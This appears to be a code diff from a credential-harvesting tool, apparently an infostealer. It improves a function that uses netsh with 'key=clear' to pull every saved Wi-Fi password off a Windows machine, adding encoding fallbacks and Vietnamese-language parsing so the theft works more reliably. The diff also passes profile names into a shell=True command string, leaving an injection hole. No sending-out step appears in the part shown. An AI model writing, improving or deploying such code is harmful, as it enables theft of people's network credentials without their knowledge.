@@ -435,45 +435,59 @@ def grab_wifi_passwords():
     
     try:
         import subprocess
-        
+
+        # Try UTF-8 first (Windows 10+), fallback to cp1252 then cp850
+        def _run_netsh(args, **kwargs):
+            for enc in ('utf-8', 'cp1252', 'cp850'):
+                try:
+                    r = subprocess.run(args, capture_output=True, text=True,
+                                      encoding=enc, errors='ignore', **kwargs)
+                    return r
+                except Exception:
+                    continue
+            return subprocess.run(args, capture_output=True, errors='ignore', **kwargs)
+
         # Get WiFi profiles
-        result = subprocess.run(
-            ['netsh', 'wlan', 'show', 'profiles'],
-            capture_output=True,
-            text=True,
-            encoding='cp850',
-            errors='ignore'
-        )
-        
-        if "no wireless" in result.stdout.lower():
+        result = _run_netsh(['netsh', 'wlan', 'show', 'profiles'])
+        stdout = result.stdout if isinstance(result.stdout, str) else result.stdout.decode('utf-8', errors='ignore')
+
+        if "no wireless" in stdout.lower() or "wi-fi" not in stdout.lower() and "wlan" not in stdout.lower() and len(stdout.strip()) < 30:
             logger.warning("No WiFi adapter found")
             return wifi_data
-        
-        profiles = [
-            line.split(" : ")[1].strip() 
-            for line in result.stdout.split('\n') 
-            if " : " in line and ("profile" in line.lower() or "hồ sơ" in line.lower())
-        ]
-        
+
+        # Broad filter: any line with " : " that looks like a profile entry
+        # Works for English ("All User Profile : SSID") and Vietnamese ("Hồ sơ ... : SSID")
+        profiles = []
+        for line in stdout.split('\n'):
+            if ' : ' not in line:
+                continue
+            lower = line.lower()
+            # Match English and Vietnamese keywords, OR fall back to indented lines with " : "
+            if ('profile' in lower or 'hồ sơ' in lower or 'h\x1b' in lower
+                    or (line.startswith('    ') and line.strip().count(' : ') == 1)):
+                val = line.split(' : ', 1)[1].strip()
+                if val and val not in profiles:
+                    profiles.append(val)
+
         logger.info(f"Found {len(profiles)} WiFi networks")
-        
+
         for profile in profiles:
             try:
-                out = subprocess.run(
+                out = _run_netsh(
                     f'netsh wlan show profile name="{profile}" key=clear',
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    encoding='cp850',
-                    errors='ignore'
+                    shell=True
                 )
-                
+                out_text = out.stdout if isinstance(out.stdout, str) else out.stdout.decode('utf-8', errors='ignore')
+
                 password = "(No Pass)"
-                for line in out.stdout.split('\n'):
-                    if ("Key Content" in line or "Nội dung khóa" in line) and " : " in line:
-                        password = line.split(" : ")[1].strip()
+                for ln in out_text.split('\n'):
+                    # English: "Key Content", Vietnamese: "Nội dung khóa" or garbled equivalent
+                    if (' : ' in ln and
+                            any(kw in ln for kw in ('Key Content', 'N\u1ed9i dung kh\u00f3a',
+                                                     'key content', 'n\u1ed9i dung'))):
+                        password = ln.split(' : ', 1)[1].strip()
                         break
-                
+
                 wifi_data[profile] = password
             except Exception as e:
                 logger.debug(f"Extract WiFi {profile} failed: {e}")
